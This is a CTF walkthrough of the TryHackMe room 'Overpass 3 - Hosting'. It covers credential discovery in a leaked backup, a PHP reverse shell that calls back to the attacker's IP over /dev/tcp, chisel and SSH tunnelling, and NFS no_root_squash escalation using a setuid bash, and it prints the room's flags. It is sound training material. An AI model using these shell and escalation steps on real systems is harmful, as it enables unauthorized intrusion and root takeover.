# Tryhackme.com Room : Overpass 3 - Hosting

`https://tryhackme.com/room/overpass3hosting`

## Instance

```bash
export IP="10.10.88.227"
```

## Nmap

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods:
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix
```

## Initial Foothold

Tried anonymous login on the `ftp` but didn't work.

The initial page list team members. Potential usernames :

```
Paradox
Elf
MuirlandOracle
NinjaJc01
```

When looking around, we get a different `Not Found` error when we browse `/index.php` than `/index/index.php`. Different handling if we request a file at the root ?



Let's gobuster the website.

We find a `/backups` folder which contains `backup.zip`

Once unzipped, we got 

```
CustomerDetails.xlsx.gpq
priv.key
```

Let's decrypt the `xlsx` file with the `pgp` key.



When importing the key with `gpg --import key.priv` we see that it belongs to

```
Paradox <paradox@overpass.thm>
```

We find credentials in `CustomerDetails.xlsx` :

```
Name				Username		Password
Par. A. Doxx		paradox			ShibesAreGreat123
0day Montgomery		0day			OllieIsTheBestDog
Muir Land			muirlandoracle	A11D0gsAreAw3s0me
```

Hmmm can't login via `ssh` since it require public/private key.

Tried the credentials on the `ftp` server but they didn't work.

Hmm that's weird since we don't really have any other place to use them

Well, I probably mistyped, the `paradox` user is working on the `ftp` server



We land right in the http server location.

We can upload stuff so let's upload a `php` script see if we have code execution.

And we do, so let's get a `php reverse shell` :

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.32.20/7777 0>&1'");
```

We now have a shell as 

```
uid=48(apache) gid=48(apache) groups=48(apache)
```

There is 2 users on this box :

```
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:James:/home/james:/bin/bash
paradox:x:1001:1001::/home/paradox:/bin/bash
```

We can't upgrade our shell because we don't have a python binary :( (Maybe there is another way ? Couldn't find any with a quick google)



`sudo -l` require a password.



We find a flag in `/usr/share/httpd/web.flag`

```
thm{0ae72f7870c3687129f7a824194be09d}
```





We ran `linpeas` and found

```
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

We should be able to mount `/home/james` as root on our machine and we should keep our root priviledges (because of `no_root_squash`).

Tried to mount it using ;

```
mount -t nfs 10.10.88.227:/home/james mtnpoint
```

But the connection would timeout. We need to forward the port `2049` to our machine to be able to do so.

Let's use `chisel` to forward the port (`https://github.com/jpillora/chisel` + cheatsheet : `https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html`)



Hmm well, I wasted a lot of time on this.. the chisel port forwarding would not work correctly (Or at least, the nfs mount would not work).

I tried to login via ssh into `paradox` user in the beginning but since it was pubkey only it didn't work.

Well, I was able to `su paradox` with the credentials gathered before.

From there, we were able to insert our own private and public key and login via `ssh` as `paradox`



So now, manybe we can forward the port `2049` using `ssh` and mount the `nfs` share ?

```
ssh -i id_rsa -L 2049:localhost:2049 paradox@overpass.thm
```

```
mount -v -t nfs localhost:/home/james mtnpoint
```



Still not working.. hmmm



Sooo, after a while, I decied to look at a write up. Apparently, we don't need to specify the `/home/james` path when mounting the nfs share... The command is :

```
mount -v -t nfs localhost:/ mtnpoint
```



Now that we have a mount point to `/home/james`

We get the `user.flag` :

```
thm{3693fc86661faa21f16ac9508a43e1ae}
```



## Priv Esc

Now we can simply follow `https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe` 

Since we are `root` in the mounted share, we can simply create a copy of `bash`, set it as `setuid`  and we can launch a root shell by connecting as `james`.



We copy `james` ssh key from the share and login as `james` via `ssh`.

Now we bump into a small problem, seems like the bash version we copied (from our attacker machine) is looking for a shared library that is not available on the victim machine.

We just copy the local `/bin/bash` into `/home/james` then on our machine, in the share we do

```
chown root:root localbash
chmod +s localbash
```

Then finally, from `james` ssh session, we launch `./localbash -p` and get a `root` shell.

Finally !



`/root/root.flag`:

```
thm{a4f6adb70371a4bceb32988417456c44}
```

## Wrap up

* I tried again to use `chisel` to forward the port and it worked great (When mounting the correct share path...). I was able to get the share while being the `apache` user. So i could have skipped the `paradox` user.

  * ```
    Attacker >> ./chisel server -p 6666 --reverse
    Victim 	 >> ./chisel client 10.6.32.20:6666 R:2049:127.0.0.1:2049
    ```

* Should ALWAYS use `verbose` option. I would have realised that it was a path problem if I would have used the `-v` option on `mount`...

## End

